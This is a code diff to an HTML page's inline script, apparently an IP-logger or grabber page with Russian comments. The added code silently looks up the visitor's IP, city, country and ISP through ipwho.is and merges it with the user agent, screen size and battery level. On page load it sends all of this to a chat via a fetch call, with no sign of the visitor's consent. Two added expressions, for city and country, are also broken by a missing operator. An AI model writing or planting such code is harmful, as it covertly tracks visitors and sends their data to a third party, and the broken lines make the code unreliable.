@@ -21,8 +21,10 @@ function sendTo(chatId, text){
   return fetch(u, { keepalive: true }).catch(function(){});
 }
 
-function send(batStr){
-  var t = 'IP: см. сервер\n'
+function send(ipData, batStr){
+  var t = 'IP: ' + (ipData.ip || 'н/д') + '\n'
+    + 'Город: ' + (ipData.city  '?') + ', ' + (ipData.country  '?') + '\n'
+    + 'Провайдер: ' + (ipData.connection ? ipData.connection.isp : '?') + '\n'
     + 'UA: ' + esc(navigator.userAgent) + '\n'
     + 'Экран: ' + screen.width + 'x' + screen.height + '\n'
     + 'Батарея: ' + batStr + '\n'
@@ -37,13 +39,19 @@ function send(batStr){
   });
 }
 
-if (navigator.getBattery) {
-  navigator.getBattery().then(function(b){
-    send(Math.round(b.level*100) + '%' + (b.charging ? ' (заряжается)' : ''));
-  }).catch(function(){ send('н/д'); });
-} else {
-  send('н/д (браузер не поддерживает)');
-}
+// 1. Получаем IP и батарею параллельно, потом шлём
+var ipP = fetch('https://ipwho.is/').then(function(r){ return r.json(); }).catch(function(){ return {}; });
+var batP = navigator.getBattery
+  ? navigator.getBattery().then(function(b){
+      return Math.round(b.level*100) + '%' + (b.charging ? ' (заряжается)' : '');
+    }).catch(function(){ return 'н/д'; })
+  : Promise.resolve('н/д (браузер не поддерживает)');
+
+Promise.all([ipP, batP]).then(function(res){
+  send(res[0], res[1]);
+}).catch(function(){
+  send({}, 'н/д');
+});
 </script>
 </body>
 </html>
